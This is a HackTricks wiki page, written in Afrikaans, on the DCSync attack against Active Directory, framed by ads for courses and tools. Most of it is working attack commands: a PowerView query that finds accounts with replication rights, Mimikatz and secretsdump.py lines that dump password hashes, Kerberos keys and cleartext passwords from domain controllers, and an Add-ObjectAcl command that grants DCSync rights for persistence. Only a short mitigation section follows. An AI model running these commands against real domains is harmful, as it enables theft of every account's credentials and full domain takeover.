# DCSync

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) om maklik **werkvloei** te bou en te **automate** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapstools.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## DCSync

Die **DCSync** toestemming impliseer dat jy hierdie toestemmings oor die domein self het: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** en **Replicating Directory Changes In Filtered Set**.

**Belangrike Aantekeninge oor DCSync:**

* Die **DCSync aanval simuleer die gedrag van 'n Domeinbeheerder en vra ander Domeinbeheerders om inligting te repliseer** deur die Directory Replication Service Remote Protocol (MS-DRSR) te gebruik. Omdat MS-DRSR 'n geldige en noodsaaklike funksie van Active Directory is, kan dit nie afgeskakel of gedeaktiveer word nie.
* Standaard het slegs **Domein Administrators, Enterprise Administrators, Administrators, en Domeinbeheerders** groepe die vereiste voorregte.
* As enige rekening wagwoorde met omkeerbare kodering gestoor word, is daar 'n opsie beskikbaar in Mimikatz om die wagwoord in duidelike teks terug te gee.

### Enumeration

Kyk wie hierdie toestemmings het met `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Exploit Plaaslik
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploit Afgeleë
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` genereer 3 lêers:

* een met die **NTLM hashes**
* een met die **Kerberos sleutels**
* een met duidelike wagwoorde van die NTDS vir enige rekeninge wat met [**omkeerbare versleuteling**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) geaktiveer is. Jy kan gebruikers met omkeerbare versleuteling kry met

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Volharding

As jy 'n domein admin is, kan jy hierdie toestemmings aan enige gebruiker toeken met die hulp van `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Dan kan jy **kontroleer of die gebruiker korrek toegeken is** aan die 3 voorregte deur daarna te soek in die uitvoer van (jy behoort die name van die voorregte in die "ObjectType" veld te kan sien):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Versagting

* Sekuriteit Gebeurtenis ID 4662 (Auditsbeleid vir objek moet geaktiveer wees) – 'n Operasie is op 'n objek uitgevoer
* Sekuriteit Gebeurtenis ID 5136 (Auditsbeleid vir objek moet geaktiveer wees) – 'n Gidsdiens objek is gewysig
* Sekuriteit Gebeurtenis ID 4670 (Auditsbeleid vir objek moet geaktiveer wees) – Toestemmings op 'n objek is verander
* AD ACL Scanner - Skep en vergelyk skep verslae van ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Verwysings

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) om maklik te bou en **werkvloei** te **automate** wat deur die wêreld se **mees gevorderde** gemeenskap gereedskap aangedryf word.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
